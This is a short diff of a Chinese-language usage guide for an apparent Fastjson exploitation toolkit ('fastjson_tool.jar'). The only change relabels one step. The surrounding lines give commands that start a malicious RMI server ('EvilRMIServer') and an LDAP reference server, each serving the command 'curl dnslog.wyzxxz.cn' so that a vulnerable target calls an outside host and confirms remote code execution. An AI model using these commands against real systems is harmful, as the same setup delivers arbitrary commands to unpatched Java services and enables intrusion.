@@ -4,7 +4,7 @@
 1. 启动RMI服务
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
-2. 启动LDAP服务3
+2. 启动LDAP服务3 (4和5的结合)
 java -cp fastjson_tool.jar LDAPRefServer3 127.0.0.1 8888 1099 "curl dnslog.wyzxxz.cn"
 
 3. 启动LDAP服务2
